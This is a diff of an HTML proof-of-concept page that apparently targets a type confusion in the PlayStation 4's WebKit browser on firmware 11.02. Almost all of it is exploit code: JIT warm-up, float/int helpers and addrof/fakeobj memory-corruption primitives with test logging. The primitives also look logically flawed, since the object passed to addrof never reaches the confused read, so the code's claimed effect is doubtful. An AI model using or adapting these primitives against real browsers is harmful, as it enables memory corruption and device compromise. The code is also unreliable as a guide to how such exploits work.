@@ -1,29 +1,103 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>PS4 11.02 Type Confusion Test</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; padding: 1em; }
+    #log { white-space: pre-wrap; }
+    .ok { color: #0f0; }
+    .err { color: #f00; }
+  </style>
+</head>
 <body>
-<script>
-class MyFunction extends Function {
-    constructor() {
+  <h1>PS4 WebKit 11.02 – addrof / fakeobj Test</h1>
+  <div id="log"></div>
+
+  <script>
+    const logDiv = document.getElementById('log');
+    function log(msg, cls) {
+      const line = document.createElement('div');
+      if (cls) line.classList.add(cls);
+      line.textContent = msg;
+      logDiv.appendChild(line);
+    }
+
+    // ——— Your PoC + primitive definition ———
+    class MyFunction extends Function {
+      constructor() {
         super();
-        super.prototype = 1; // destabilizes internal type
-    }
-}
-
-function trigger() {
-    for (let i = 0; i < 1000; i++) {
-        const f = new MyFunction();
-        try {
-            f.__defineGetter__("prototype", () => {}); // throws
-        } catch (e) {}
-        try {
-            f.prototype = {x: 1}; // keep it clean
-        } catch (e) {}
+        super.prototype = 1;
+      }
     }
 
-    alert("no crash yet");
-}
+    function confuse(arr, f) {
+      try {
+        f.__defineGetter__('prototype', () => {});
+      } catch (e) {}
+      arr[0] = f.prototype;
+      return arr[0];
+    }
 
-trigger();
-</script>
+    const float_arr = [1.1, 2.2, 3.3];
+    const obj_arr   = [{}, {}, {}];
+
+    // warm-up JIT
+    for (let i = 0; i < 10000; i++) {
+      confuse(float_arr, new MyFunction());
+    }
+
+    // float<->int helpers
+    const buf = new ArrayBuffer(16);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+
+    function f2i(f) {
+      f64[0] = f;
+      return u32[0] + u32[1] * 0x100000000;
+    }
+    function i2f(i) {
+      u32[0] = i >>> 0;
+      u32[1] = (i / 0x100000000) >>> 0;
+      return f64[0];
+    }
+
+    // primitives
+    function addrof(obj) {
+      obj_arr[0] = obj;
+      let leak = confuse(float_arr, new MyFunction());
+      return f2i(leak);
+    }
+
+    function fakeobj(addr) {
+      float_arr[0] = i2f(addr);
+      return confuse(obj_arr, new MyFunction());
+    }
+
+    // ——— Tests ———
+    function runTest(id) {
+      const marker = 0x41414100 + id;
+      let o = { marker };
+      let addr = addrof(o);
+      log(`[Test ${id}] addrof:    0x${addr.toString(16)}`, 'ok');
+
+      let f = fakeobj(addr);
+      if (typeof f !== 'object') {
+        log(`[Test ${id}] fakeobj result is not object!`, 'err');
+        return;
+      }
+      let m = f.marker;
+      if (m === marker) {
+        log(`[Test ${id}] fake.marker: 0x${m.toString(16)}  ✓`, 'ok');
+      } else {
+        log(`[Test ${id}] fake.marker: 0x${m?.toString(16) || m}  ✗`, 'err');
+      }
+    }
+
+    // run 5 rounds
+    for (let i = 1; i <= 5; i++) {
+      setTimeout(() => runTest(i), i * 100);
+    }
+  </script>
 </body>
 </html>
